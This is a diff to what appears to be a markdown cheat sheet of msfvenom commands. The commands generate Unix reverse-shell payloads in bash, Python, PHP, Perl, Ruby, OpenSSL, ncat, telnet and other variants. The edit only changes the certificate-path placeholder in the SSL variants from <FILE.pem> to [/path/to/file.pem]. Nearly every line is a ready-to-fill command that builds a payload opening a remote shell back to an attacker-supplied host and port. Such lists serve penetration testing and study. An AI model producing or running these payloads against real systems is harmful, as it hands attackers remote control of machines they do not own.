@@ -8,7 +8,7 @@
 
 `$ msfvenom -p cmd/unix/reverse_bash lhost=<IP> lport=<PORT>`
 
-`$ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+`$ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
 
 `$ msfvenom -p cmd/unix/reverse_bash_udp lhost=<IP> lport=<PORT>`
 
@@ -16,17 +16,17 @@
 
 `$ msfvenom -p cmd/unix/reverse_python lhost=<IP> lport=<PORT>`
 
-`$ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+`$ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
 
 ## PHP
 
-`$ msfvenom -p cmd/unix/reverse_php_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+`$ msfvenom -p cmd/unix/reverse_php_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
 
 ## Perl
 
 `$ msfvenom -p cmd/unix/reverse_perl lhost=<IP> lport=<PORT>`
 
-`$ msfvenom -p cmd/unix/reverse_perl_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+`$ msfvenom -p cmd/unix/reverse_perl_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
 
 ## SSH
 
@@ -34,7 +34,7 @@
 
 ## OpenSSL
 
-`$ msfvenom -p cmd/unix/reverse_openssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+`$ msfvenom -p cmd/unix/reverse_openssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
 
 ## Zsh
 
@@ -48,7 +48,7 @@
 
 `$ msfvenom -p cmd/unix/reverse_ruby lhost=<IP> lport=<PORT>`
 
-`$ msfvenom -p cmd/unix/reverse_ruby_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+`$ msfvenom -p cmd/unix/reverse_ruby_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
 
 ## Java
 
@@ -58,7 +58,7 @@
 
 `$ msfvenom -p cmd/unix/reverse_lua lhost=<IP> lport=<PORT>`
 
-`$ msfvenom -p cmd/unix/reverse_ncat_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+`$ msfvenom -p cmd/unix/reverse_ncat_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
 
 ## Tclsh
 
@@ -82,4 +82,4 @@
 
 ## Telnet
 
-`$ msfvenom -p cmd/unix/reverse_ssl_double_telnet handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+`$ msfvenom -p cmd/unix/reverse_ssl_double_telnet handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
